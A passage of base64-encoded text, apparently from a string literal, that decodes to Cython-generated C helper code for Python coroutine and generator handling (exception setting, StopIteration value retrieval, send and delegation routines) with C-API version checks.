0lPTl9IRVggPj0gKDB4MDMwQzAwQTYpKSB8fCB1bmxpa2VseShQeVR1cGxlX0NoZWNrKHZhbHVlKSB8fCBQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHZhbHVlKSkpIHsKICAgICAgICBpZiAoUFlfVkVSU0lPTl9IRVggPj0gKDB4MDMwZTAwQTEpKSB7CiAgICAgICAgICAgIGV4YyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoZXhjX3R5cGUsIHZhbHVlKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeU9iamVjdCAqYXJnc190dXBsZSA9IFB5VHVwbGVfTmV3KDEpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIWFyZ3NfdHVwbGUpKSByZXR1cm47CiAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICAgICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJnc190dXBsZSwgMCwgdmFsdWUpOwogICAgICAgICAgICBleGMgPSBQeU9iamVjdF9DYWxsKGV4Y190eXBlLCBhcmdzX3R1cGxlLCBOVUxMKTsKICAgICAgICAgICAgUHlfREVDUkVGKGFyZ3NfdHVwbGUpOwogICAgICAgIH0KICAgICAgICBpZiAodW5saWtlbHkoIWV4YykpIHJldHVybjsKICAgIH0gZWxzZSB7CiAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgICAgICBleGMgPSB2YWx1ZTsKICAgIH0KICAgICNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgaWYgKCFfX3B5eF90c3RhdGUtPmV4Y19pbmZvLT5leGNfdmFsdWUpCiAgICAjZWxzZQogICAgaWYgKCFfX3B5eF90c3RhdGUtPmV4Y190eXBlKQogICAgI2VuZGlmCiAgICB7CiAgICAgICAgUHlfSU5DUkVGKGV4Y190eXBlKTsKICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKGV4Y190eXBlLCBleGMsIE5VTEwpOwogICAgICAgIHJldHVybjsKICAgIH0KICAgICNlbmRpZgojZWxzZQogICAgZXhjID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhleGNfdHlwZSwgdmFsdWUpOwogICAgaWYgKHVubGlrZWx5KCFleGMpKSByZXR1cm47CiNlbmRpZgogICAgUHlFcnJfU2V0T2JqZWN0KGV4Y190eXBlLCBleGMpOwogICAgUHlfREVDUkVGKGV4Yyk7Cn0KCgojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2luY2x1ZGUgPGZyYW1lb2JqZWN0Lmg+CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMGE2ICYmICFkZWZpbmVkKFBZUFlfVkVSU0lPTikKICAjaWZuZGVmIFB5X0JVSUxEX0NPUkUKICAgICNkZWZpbmUgUHlfQlVJTERfQ09SRSAxCiAgI2VuZGlmCiAgI2luY2x1ZGUgImludGVybmFs""L3B5Y29yZV9mcmFtZS5oIgojZW5kaWYKI2VuZGlmIC8vIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZApfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikgewojaWYgQ1lUSE9OX1VTRV9BTV9TRU5ECiAgICBnZW4tPnlpZWxkZnJvbV9hbV9zZW5kID0gTlVMTDsKI2VuZGlmCiAgICBQeV9DTEVBUihnZW4tPnlpZWxkZnJvbSk7Cn0Kc3RhdGljIGludCBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqKnB2YWx1ZSkgewogICAgUHlPYmplY3QgKmV0LCAqZXYsICp0YjsKICAgIFB5T2JqZWN0ICp2YWx1ZSA9IE5VTEw7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF90c3RhdGUpOwogICAgX19QeXhfRXJyRmV0Y2goJmV0LCAmZXYsICZ0Yik7CiAgICBpZiAoIWV0KSB7CiAgICAgICAgUHlfWERFQ1JFRih0Yik7CiAgICAgICAgUHlfWERFQ1JFRihldik7CiAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpOwogICAgICAgICpwdmFsdWUgPSBQeV9Ob25lOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgaWYgKGxpa2VseShldCA9PSBQeUV4Y19TdG9wSXRlcmF0aW9uKSkgewogICAgICAgIGlmICghZXYpIHsKICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpOwogICAgICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICAgICAgfQogICAgICAgIGVsc2UgaWYgKGxpa2VseShfX1B5eF9JU19UWVBFKGV2LCAoUHlUeXBlT2JqZWN0KilQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIHsKICAgICAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTAogICAgICAgICAgICB2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHIoZXYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YWx1ZSk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSBnb3RvIGxpbWl0ZWRfYXBpX2ZhaWx1cmU7CiAgICAgICAgICAgICNlbHNlCiAgICAgICAgICAgIHZhbHVlID0gKChQeVN0b3BJdGVyYXRpb25PYmplY3QgKilldiktPnZhbHVlOwogICAgICAgICAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgUHlfREVDUkVGKGV2KTsKICAgICAgICB9CiAgICAgICAgZWxzZSBpZiAodW5saWtlbHkoUHlUdXBsZV9DaGVjayhldikpKSB7CiAgICAgICAgICAgIFB5X3NzaXplX3QgdHVwbGVfc2l6ZSA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoZXYpOwogICAgICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgICAgIGlmICh1bmxpa2VseSh0dXBsZV9zaXplIDwgMCkpIHsKICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodGIpOwogICAgICAgICAgICAgICAgUHlfREVDUkVGKGV2KTsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihldCk7""CiAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIGlmICh0dXBsZV9zaXplID49IDEpIHsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgICAgICB2YWx1ZSA9IFB5VHVwbGVfR0VUX0lURU0oZXYsIDApOwogICAgICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKI2VsaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgICAgICAgICAgdmFsdWUgPSBQeVNlcXVlbmNlX0lURU0oZXYsIDApOwojZWxzZQogICAgICAgICAgICAgICAgdmFsdWUgPSBQeVNlcXVlbmNlX0dldEl0ZW0oZXYsIDApOwogICAgICAgICAgICAgICAgaWYgKCF2YWx1ZSkgZ290byBsaW1pdGVkX2FwaV9mYWlsdXJlOwojZW5kaWYKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTsKICAgICAgICAgICAgICAgIHZhbHVlID0gUHlfTm9uZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBQeV9ERUNSRUYoZXYpOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmICghX19QeXhfVHlwZUNoZWNrKGV2LCAoUHlUeXBlT2JqZWN0KilQeUV4Y19TdG9wSXRlcmF0aW9uKSkgewogICAgICAgICAgICB2YWx1ZSA9IGV2OwogICAgICAgIH0KICAgICAgICBpZiAobGlrZWx5KHZhbHVlKSkgewogICAgICAgICAgICBQeV9YREVDUkVGKHRiKTsKICAgICAgICAgICAgUHlfREVDUkVGKGV0KTsKICAgICAgICAgICAgKnB2YWx1ZSA9IHZhbHVlOwogICAgICAgICAgICByZXR1cm4gMDsKICAgICAgICB9CiAgICB9IGVsc2UgaWYgKCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXQsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSB7CiAgICAgICAgX19QeXhfRXJyUmVzdG9yZShldCwgZXYsIHRiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeUVycl9Ob3JtYWxpemVFeGNlcHRpb24oJmV0LCAmZXYsICZ0Yik7CiAgICBpZiAodW5saWtlbHkoIVB5T2JqZWN0X1R5cGVDaGVjayhldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7CiAgICAgICAgX19QeXhfRXJyUmVzdG9yZShldCwgZXYsIHRiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9YREVDUkVGKHRiKTsKICAgIFB5X0RFQ1JFRihldCk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICB2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHIoZXYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YWx1ZSk7CiNlbHNlCiAgICB2YWx1ZSA9ICgoUHlTdG9wSXRlcmF0aW9uT2JqZWN0ICopZXYpLT52YWx1ZTsKICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiNlbmRpZgogICAgUHlfREVDUkVGKGV2KTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSByZXR1cm4gLTE7CiNlbmRpZgogICAg""KnB2YWx1ZSA9IHZhbHVlOwogICAgcmV0dXJuIDA7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgfHwgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICBsaW1pdGVkX2FwaV9mYWlsdXJlOgogICAgUHlfWERFQ1JFRihldCk7CiAgICBQeV9YREVDUkVGKHRiKTsKICAgIFB5X1hERUNSRUYoZXYpOwogICAgcmV0dXJuIC0xOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORQpfX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX3N0YXR1c19mcm9tX3Jlc3VsdChQeU9iamVjdCAqKnJldHZhbCkgewogICAgaWYgKCpyZXR2YWwpIHsKICAgICAgICByZXR1cm4gUFlHRU5fTkVYVDsKICAgIH0gZWxzZSBpZiAobGlrZWx5KF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIHJldHZhbCkgPT0gMCkpIHsKICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUKdm9pZCBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKSB7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICBQeV9DTEVBUihleGNfc3RhdGUtPmV4Y192YWx1ZSk7CiNlbHNlCiAgICBQeU9iamVjdCAqdCwgKnYsICp0YjsKICAgIHQgPSBleGNfc3RhdGUtPmV4Y190eXBlOwogICAgdiA9IGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlOwogICAgdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICBleGNfc3RhdGUtPmV4Y190eXBlID0gTlVMTDsKICAgIGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlID0gTlVMTDsKICAgIGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjayA9IE5VTEw7CiAgICBQeV9YREVDUkVGKHQpOwogICAgUHlfWERFQ1JFRih2KTsKICAgIFB5X1hERUNSRUYodGIpOwojZW5kaWYKfQojZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbikgIChfX1B5eF9fQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKSwgKFB5T2JqZWN0KilOVUxMKQpzdGF0aWMgdm9pZCBfX1B5eF9fQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHsKICAgIGNvbnN0IGNoYXIgKm1zZzsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGdlbik7CiAgICBpZiAoKDApKSB7CiAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRUQKICAgIH0gZWxzZSBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKChQeU9iamVjdCopZ2VuKSkgewogICAgICAgIG1zZyA9ICJjb3JvdXRpbmUgYWxyZWFkeSBleGVjdXRpbmciOwogICAgI2VuZGlmCiAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgfSBlbHNlIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KChQeU9iamVjdCop""Z2VuKSkgewogICAgICAgIG1zZyA9ICJhc3luYyBnZW5lcmF0b3IgYWxyZWFkeSBleGVjdXRpbmciOwogICAgI2VuZGlmCiAgICB9IGVsc2UgewogICAgICAgIG1zZyA9ICJnZW5lcmF0b3IgYWxyZWFkeSBleGVjdXRpbmciOwogICAgfQogICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1ZhbHVlRXJyb3IsIG1zZyk7Cn0Kc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX0FscmVhZHlUZXJtaW5hdGVkRXJyb3IoUHlPYmplY3QgKmdlbiwgUHlPYmplY3QgKnZhbHVlLCBpbnQgY2xvc2luZykgewogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGNsb3NpbmcpOwogICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICBpZiAoIWNsb3NpbmcgJiYgX19QeXhfQ29yb3V0aW5lX0NoZWNrKGdlbikpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfUnVudGltZUVycm9yLCAiY2Fubm90IHJldXNlIGFscmVhZHkgYXdhaXRlZCBjb3JvdXRpbmUiKTsKICAgIH0gZWxzZQogICAgI2VuZGlmCiAgICBpZiAodmFsdWUpIHsKICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgICAgIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KGdlbikpCiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEFzeW5jSXRlcmF0aW9uKTsKICAgICAgICBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19TdG9wSXRlcmF0aW9uKTsKICAgIH0KfQpzdGF0aWMKX19QeXhfUHlTZW5kUmVzdWx0IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmVzdWx0LCBpbnQgY2xvc2luZykgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBQeVRocmVhZFN0YXRlICp0c3RhdGU7CiAgICBfX1B5eF9FeGNJbmZvU3RydWN0ICpleGNfc3RhdGU7CiAgICBQeU9iamVjdCAqcmV0dmFsOwogICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhzZWxmKSk7ICAvLyBDYWxsZXJzIHNob3VsZCBlbnN1cmUgaXNfcnVubmluZwogICAgaWYgKHVubGlrZWx5KHNlbGYtPnJlc3VtZV9sYWJlbCA9PSAtMSkpIHsKICAgICAgICBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVRlcm1pbmF0ZWRFcnJvcigoUHlPYmplY3QqKXNlbGYsIHZhbHVlLCBjbG9zaW5nKTsKICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9CiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICB0c3RhdGUgPSBfX3B5eF90c3RhdGU7CiNlbHNlCiAgICB0c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7CiNlbmRpZgogICAgZXhjX3N0YXRlID0gJnNlbGYtPmdpX2V4Y19zdGF0ZTsKICAgIGlmIChleGNfc3RhdGUtPmV4Y192YWx1ZSkgewogICAgICAgICNpZiBDWVRIT05fQ09NUElM""SU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgICAgICNlbHNlCiAgICAgICAgUHlPYmplY3QgKmV4Y190YjsKICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgZXhjX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTsKICAgICAgICAjZWxpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICAgICAgZXhjX3RiID0gKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSBleGNfc3RhdGUtPmV4Y192YWx1ZSktPnRyYWNlYmFjazsKICAgICAgICAjZWxzZQogICAgICAgIGV4Y190YiA9IGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjazsKICAgICAgICAjZW5kaWYKICAgICAgICBpZiAoZXhjX3RiKSB7CiAgICAgICAgICAgIFB5VHJhY2ViYWNrT2JqZWN0ICp0YiA9IChQeVRyYWNlYmFja09iamVjdCAqKSBleGNfdGI7CiAgICAgICAgICAgIFB5RnJhbWVPYmplY3QgKmYgPSB0Yi0+dGJfZnJhbWU7CiAgICAgICAgICAgIGFzc2VydChmLT5mX2JhY2sgPT0gTlVMTCk7CiAgICAgICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMEExCiAgICAgICAgICAgIGYtPmZfYmFjayA9IFB5VGhyZWFkU3RhdGVfR2V0RnJhbWUodHN0YXRlKTsKICAgICAgICAgICAgI2Vsc2UKICAgICAgICAgICAgUHlfWElOQ1JFRih0c3RhdGUtPmZyYW1lKTsKICAgICAgICAgICAgZi0+Zl9iYWNrID0gdHN0YXRlLT5mcmFtZTsKICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICAgICAgUHlfREVDUkVGKGV4Y190Yik7CiAgICAgICAgICAgICNlbmRpZgogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgIH0KI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIGV4Y19zdGF0ZS0+cHJldmlvdXNfaXRlbSA9IHRzdGF0ZS0+ZXhjX2luZm87CiAgICB0c3RhdGUtPmV4Y19pbmZvID0gZXhjX3N0YXRlOwojZWxzZQogICAgaWYgKGV4Y19zdGF0ZS0+ZXhjX3R5cGUpIHsKICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZleGNfc3RhdGUtPmV4Y190eXBlLCAmZXhjX3N0YXRlLT5leGNfdmFsdWUsICZleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spOwogICAgfSBlbHNlIHsKICAgICAgICBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoZXhjX3N0YXRlKTsKICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZleGNfc3RhdGUtPmV4Y190eXBlLCAmZXhjX3N0YXRlLT5leGNfdmFsdWUsICZleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spOwogICAgfQojZW5kaWYKICAgIHJldHZhbCA9IHNlbGYtPmJvZHkoc2VsZiwgdHN0YXRlLCB2YWx1ZSk7CiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgICBleGNfc3RhdGUgPSAmc2VsZi0+Z2lfZXhjX3N0""YXRlOwogICAgdHN0YXRlLT5leGNfaW5mbyA9IGV4Y19zdGF0ZS0+cHJldmlvdXNfaXRlbTsKICAgIGV4Y19zdGF0ZS0+cHJldmlvdXNfaXRlbSA9IE5VTEw7CiAgICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRGcmFtZUJhY2twb2ludGVyKGV4Y19zdGF0ZSk7CiNlbmRpZgogICAgKnJlc3VsdCA9IHJldHZhbDsKICAgIGlmIChzZWxmLT5yZXN1bWVfbGFiZWwgPT0gLTEpIHsKICAgICAgICByZXR1cm4gbGlrZWx5KHJldHZhbCkgPyBQWUdFTl9SRVRVUk4gOiBQWUdFTl9FUlJPUjsKICAgIH0KICAgIHJldHVybiBQWUdFTl9ORVhUOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ29yb3V0aW5lX1Jlc2V0RnJhbWVCYWNrcG9pbnRlcihfX1B5eF9FeGNJbmZvU3RydWN0ICpleGNfc3RhdGUpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBDWVRIT05fVU5VU0VEX1ZBUihleGNfc3RhdGUpOwojZWxzZQogICAgUHlPYmplY3QgKmV4Y190YjsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICBpZiAoIWV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKSByZXR1cm47CiAgICBleGNfdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2soZXhjX3N0YXRlLT5leGNfdmFsdWUpOwogICAgI2Vsc2UKICAgIGV4Y190YiA9IGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjazsKICAgICNlbmRpZgogICAgaWYgKGxpa2VseShleGNfdGIpKSB7CiAgICAgICAgUHlUcmFjZWJhY2tPYmplY3QgKnRiID0gKFB5VHJhY2ViYWNrT2JqZWN0ICopIGV4Y190YjsKICAgICAgICBQeUZyYW1lT2JqZWN0ICpmID0gdGItPnRiX2ZyYW1lOwogICAgICAgIFB5X0NMRUFSKGYtPmZfYmFjayk7CiAgICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQKICAgICAgICBQeV9ERUNSRUYoZXhjX3RiKTsKICAgICAgICAjZW5kaWYKICAgIH0KI2VuZGlmCn0KI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChnZW4sIHJlc3VsdCwgcmV0dmFsLCBpdGVybmV4dClcCiAgICAoKHJlc3VsdCkgPT0gUFlHRU5fTkVYVCA/IChyZXR2YWwpIDogX19QeXhfX0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KGdlbiwgcmVzdWx0LCByZXR2YWwsIGl0ZXJuZXh0KSkKc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfX0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KFB5T2JqZWN0KiBnZW4sIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQsIFB5T2JqZWN0ICpyZXR2YWwsIGludCBpdGVybmV4dCkgewogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTsKICAgIGlmIChsaWtlbHkocmVzdWx0ID09IFBZR0VOX1JFVFVSTikpIHsKICAgICAgICBpbnQgaXNfYXN5bmMgPSAwOwogICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICAgICAgaXNfYXN5bmMgPSBfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KGdlbik7CiAgICAgICAg""I2VuZGlmCiAgICAgICAgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24ocmV0dmFsLCBpc19hc3luYywgaXRlcm5leHQpOwogICAgICAgIFB5X1hERUNSRUYocmV0dmFsKTsKICAgIH0KICAgIHJldHVybiBOVUxMOwp9CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUKUHlPYmplY3QgKl9fUHl4X1B5R2VuX1NlbmQoUHlHZW5PYmplY3QgKmdlbiwgUHlPYmplY3QgKmFyZykgewojaWYgUFlfVkVSU0lPTl9IRVggPD0gMHgwMzBBMDBBMQogICAgcmV0dXJuIF9QeUdlbl9TZW5kKGdlbiwgYXJnKTsKI2Vsc2UKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBpZiAoUHlJdGVyX1NlbmQoKFB5T2JqZWN0KilnZW4sIGFyZyA/IGFyZyA6IFB5X05vbmUsICZyZXN1bHQpID09IFBZR0VOX1JFVFVSTikgewogICAgICAgIGlmIChQeUFzeW5jR2VuX0NoZWNrRXhhY3QoZ2VuKSkgewogICAgICAgICAgICBhc3NlcnQocmVzdWx0ID09IFB5X05vbmUpOwogICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbik7CiAgICAgICAgfQogICAgICAgIGVsc2UgaWYgKHJlc3VsdCA9PSBQeV9Ob25lKSB7CiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEl0ZXJhdGlvbik7CiAgICAgICAgfQogICAgICAgIGVsc2UgewojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMEExCiAgICAgICAgICAgIF9QeUdlbl9TZXRTdG9wSXRlcmF0aW9uVmFsdWUocmVzdWx0KTsKI2Vsc2UKICAgICAgICAgICAgaWYgKCFQeVR1cGxlX0NoZWNrKHJlc3VsdCkgJiYgIVB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2socmVzdWx0KSkgewogICAgICAgICAgICAgICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX1N0b3BJdGVyYXRpb24sIHJlc3VsdCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBQeU9iamVjdCAqZXhjID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhQeUV4Y19TdG9wSXRlcmF0aW9uLCByZXN1bHQpOwogICAgICAgICAgICAgICAgaWYgKGxpa2VseShleGMgIT0gTlVMTCkpIHsKICAgICAgICAgICAgICAgICAgICBQeUVycl9TZXRPYmplY3QoUHlFeGNfU3RvcEl0ZXJhdGlvbiwgZXhjKTsKICAgICAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZXhjKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQojZW5kaWYKICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKHJlc3VsdCk7CiAgICAgICAgcmVzdWx0ID0gTlVMTDsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7CiNlbmRpZgp9CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBfX1B5eF9QeVNlbmRSZXN1bHQKX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIFB5T2JqZWN0KiogcmV0dmFsKSB7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgUHlPYmplY3QgKnZhbCA9IE5VTEw7CiAgICBhc3NlcnQoX19QeXhfQ29yb3V0""aW5lX2dldF9pc19ydW5uaW5nKGdlbikpOwogICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTsKICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsICZ2YWwpOwogICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIHZhbCwgcmV0dmFsLCAwKTsKICAgIFB5X1hERUNSRUYodmFsKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2lmIENZVEhPTl9VU0VfQU1fU0VORApzdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0Cl9fUHl4X0Nvcm91dGluZV9TZW5kVG9EZWxlZ2F0ZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiw